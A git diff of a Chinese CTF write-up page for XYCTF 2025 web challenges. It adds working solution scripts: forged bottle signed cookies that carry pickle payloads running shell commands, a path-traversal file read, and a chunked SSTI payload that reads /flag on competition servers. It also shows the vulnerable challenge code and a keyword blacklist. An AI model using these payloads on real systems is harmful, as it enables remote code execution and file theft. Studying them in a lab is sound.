@@ -282,7 +282,24 @@
             <nav id="TableOfContents">
   <ol>
     <li><a href="#ez_puzzle">ez_puzzle</a></li>
-    <li><a href="#signin">Signin</a></li>
+    <li><a href="#signin">Signin</a>
+      <ol>
+        <li><a href="#pickle反序列化bottle的cookie签名">pickle反序列化+bottle的cookie签名</a></li>
+      </ol>
+    </li>
+    <li><a href="#出题人已疯">出题人已疯</a>
+      <ol>
+        <li><a href="#利用os中的属性可赋值绕过字符限制">利用os中的属性可赋值绕过字符限制</a></li>
+      </ol>
+    </li>
+    <li><a href="#出题人又疯">出题人又疯</a>
+      <ol>
+        <li><a href="#bottle中ssti利用斜体字绕过waf">bottle中ssti利用斜体字绕过waf</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezsql手动滑稽">ezsql(手动滑稽)</a></li>
+    <li><a href="#fate">Fate</a></li>
+    <li><a href="#now-you-see-me-1">Now you see me 1</a></li>
   </ol>
 </nav>
         </div>
@@ -351,7 +368,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 2 分钟
+                    阅读时长: 8 分钟
                 </time>
             </div>
         
@@ -370,7 +387,7 @@
 <h2 id="ez_puzzle">ez_puzzle
 </h2><p>开发者工具打开源码然后会触发程序的反调试。这⾥直接右键，然后选择&quot;向忽略列表添加脚本&quot;。整个程序就不会停⽌</p>
 <p>了，但是这样我们也不能调试了。不过没关系，这一步不重要</p>
-<img src="image-20250424224623479.png" alt="image-20250424224623479" style="zoom:33%;" />
+<img src="image-20250424224623479.png" alt="image-20250424224623479" style="zoom: 33%;" />
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -381,7 +398,8 @@
 </div>
 </div><img src="image-20250424223733606.png" alt="image-20250424223733606" style="zoom:33%;" />
 <h2 id="signin">Signin
-</h2><div class="highlight"><div class="chroma">
+</h2><h3 id="pickle反序列化bottle的cookie签名">pickle反序列化+bottle的cookie签名
+</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -519,12 +537,602 @@
 <pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">download</span><span class="err">?</span><span class="n">filename</span><span class="o">=./.././.././../</span><span class="n">secret</span><span class="o">.</span><span class="n">txt</span> 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="image-20250424233507428.png" alt="image-20250424233507428" style="zoom:50%;" />
+</div><img src="image-20250424233507428.png" alt="image-20250424233507428" />
 <p><strong>拿到secret：Hell0_H@cker_Y0u_A3r_Sm@r7</strong></p>
-<p>访问secert抓包，一看这个base64编码有这么多A，不出意外就是打pickle反序列化了</p>
+<p>访问secret抓包，一看这个base64编码有这么多A，不出意外就是打pickle反序列化了</p>
 <img src="image-20250424233917984.png" alt="image-20250424233917984" style="zoom:50%;" />
 <p>解码一看，嗯嗯，不错</p>
 <img src="image-20250424234112927.png" alt="image-20250424234112927" style="zoom:33%;" />
+<p>但是注意，直接打pickle反序列化不行，不然这个secret有啥用？bottle有独特的cookie解析机制，看源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_cookie</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Return the content of a cookie. To read a `Signed Cookie`, the
+</span></span></span><span class="line"><span class="cl"><span class="s2">            `secret` must match the one used to create the cookie (see
+</span></span></span><span class="line"><span class="cl"><span class="s2">            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
+</span></span></span><span class="line"><span class="cl"><span class="s2">            cookie or wrong signature), return a default value. &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">secret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># See BaseResponse.set_cookie for details on signed cookies.</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">value</span> <span class="ow">and</span> <span class="n">value</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="s1">&#39;?&#39;</span> <span class="ow">in</span> <span class="n">value</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sig</span><span class="p">,</span> <span class="n">msg</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">tob</span><span class="p">,</span> <span class="n">value</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">hash</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">tob</span><span class="p">(</span><span class="n">secret</span><span class="p">),</span> <span class="n">msg</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">digestmod</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">_lscmp</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">hash</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">dst</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>	<span class="c1">#这里触发pickle的反序列化的，果然没猜错</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">dst</span> <span class="ow">and</span> <span class="n">dst</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">key</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">dst</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">default</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">value</span> <span class="ow">or</span> <span class="n">default</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解析流程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">首先得到cookies中的值</span>
+</span></span><span class="line"><span class="cl"><span class="n">判断是否存在secret参数</span><span class="err">，</span><span class="n">也就是检验是否存在签名密钥</span><span class="err">。</span><span class="n">若不存在</span><span class="err">，</span><span class="n">直接返回值</span><span class="err">；</span><span class="n">若存在</span><span class="err">，</span><span class="n">则开始下一步</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">检验格式</span><span class="err">：</span><span class="n">以</span><span class="err">!</span><span class="n">开头并且其中包含</span><span class="err">?</span><span class="n">的cookie值才有效</span><span class="err">，</span><span class="n">否则直接返回deflaut</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">将值拆分为签名sig和消息msg并使用secret对msg进行HMAC哈希计算</span><span class="err">（</span><span class="n">算法由digestmod指定</span><span class="err">，</span><span class="n">默认SHA256</span><span class="err">）。</span><span class="n">再使用_lscmp对比生成的哈希与Cookie中的签名</span><span class="err">，</span><span class="n">验证签名是否有效</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">然后问题来了</span><span class="err">，</span><span class="n">如果验证通过</span><span class="err">，</span><span class="n">则直接对msg进行Base64解码并用pickle反序列化数据</span><span class="err">。</span><span class="n">不论后面如何</span><span class="err">，</span><span class="n">只要能到这一步</span><span class="err">，</span><span class="n">就能干些坏事了</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以直接开始伪造cookie，<code>bottle</code>有一个专门用于构造cookie的<code>cookie_encode</code>方法,不过这个用这个下的bottle版本小于0.13，因为Bottle 0.13弃用了cookie_encode，然后由于我的python版本是13.3版本太高，调用这个低版本的bottle出现模块不兼容，我又不想换python版本，所以就没用下列的脚本，用的手动构造cookie</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">cookie_encode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="s2">&#34;Hell0_H@cker_Y0u_A3r_Sm@r7&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;&#34;&#34;__import__(&#39;os&#39;).system(&#39;cp /f* ./2.txt&#39;)&#34;&#34;&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exp</span> <span class="o">=</span> <span class="n">cookie_encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="p">[</span><span class="n">Test</span><span class="p">()]}),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://gz.imxbt.cn:20458/secret&#39;</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">exp</span><span class="o">.</span><span class="n">decode</span><span class="p">()})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>手动构造cookie代码是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gen_cookie</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b64pld</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;Hell0_H@cker_Y0u_A3r_Sm@r7&#34;</span><span class="p">,</span> <span class="n">b64pld</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;&#34;!&#39;</span> <span class="o">+</span> <span class="n">signature</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;?&#34;</span> <span class="o">+</span> <span class="n">b64pld</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;(cos
+</span></span></span><span class="line"><span class="cl"><span class="s1">system
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;cat /f* &gt; flag&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">o.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exp</span> <span class="o">=</span> <span class="n">gen_cookie</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://gz.imxbt.cn:20025/secret&#39;</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">exp</span><span class="o">.</span><span class="n">decode</span><span class="p">()})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.cnblogs.com/LAMENTXU/articles/18730353"  target="_blank" rel="noopener"
+    >XYCTF 2025 出题人wp LamentXU - LamentXU - 博客园</a></p>
+<p><a class="link" href="https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/index.html"  target="_blank" rel="noopener"
+    >XYCTF2025-WriteUp | HvAng&rsquo;s Nests</a></p>
+<p><a class="link" href="https://www.tremse.cn/2025/04/12/bottle%e6%a1%86%e6%9e%b6%e7%9a%84%e4%b8%80%e4%ba%9b%e7%89%b9%e6%80%a7/#cookie-chu-li-ji-zhi"  target="_blank" rel="noopener"
+    >bottle框架的一些特性 | Tremseの部屋</a></p>
+<h2 id="出题人已疯">出题人已疯
+</h2><h3 id="利用os中的属性可赋值绕过字符限制">利用os中的属性可赋值绕过字符限制
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bottle</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">flag in /flag
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@bottle.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;Hello, World!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@bottle.route</span><span class="p">(</span><span class="s1">&#39;/attack&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">payload</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">25</span> <span class="ow">and</span> <span class="s1">&#39;open&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span> <span class="ow">and</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">bottle</span><span class="o">.</span><span class="n">template</span><span class="p">(</span><span class="s1">&#39;hello &#39;</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bottle</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;Invalid payload&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bottle</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>显然考bottle中的ssti只是限制了字数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://gz.imxbt.cn:20035/attack&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;cat /f*&gt;123&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="p">[</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="mi">3</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">p</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">%import os;os.a=&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">%import os;os.a+=&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;payload&#34;</span><span class="p">:</span><span class="n">tmp</span><span class="p">})</span> 	<span class="c1">#由于限制了字符，所以将payload分片注入到os.a中</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;payload&#34;</span><span class="p">:</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">%i</span><span class="s2">mport os;eval(os.a)&#34;</span><span class="p">})</span>	<span class="c1">#执行os.a</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;payload&#34;</span><span class="p">:</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">%i</span><span class="s2">nclude(&#39;123&#39;)&#34;</span><span class="p">})</span><span class="o">.</span><span class="n">text</span>	<span class="c1">#文件读取</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面从文章讲的非常详细，可以看看</p>
+<p>[<a class="link" href="https://blog.csdn.net/Python1111111/article/details/147084841"  target="_blank" rel="noopener"
+    >XYCTF 2025 web 出题人已疯]以新手角度快速理解官方exp的解题思路-CSDN博客</a></p>
+<h2 id="出题人又疯">出题人又疯
+</h2><h3 id="bottle中ssti利用斜体字绕过waf">bottle中ssti利用斜体字绕过waf
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">@File    :   app.py
+</span></span></span><span class="line"><span class="cl"><span class="s1">@Time    :   2025/03/29 15:52:17
+</span></span></span><span class="line"><span class="cl"><span class="s1">@Author  :   LamentXU 
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bottle</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">flag in /flag
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@bottle.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;Hello, World!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;o&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;import&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span> <span class="p">,</span> <span class="s1">&#39;read&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@bottle.route</span><span class="p">(</span><span class="s1">&#39;/attack&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">)</span>
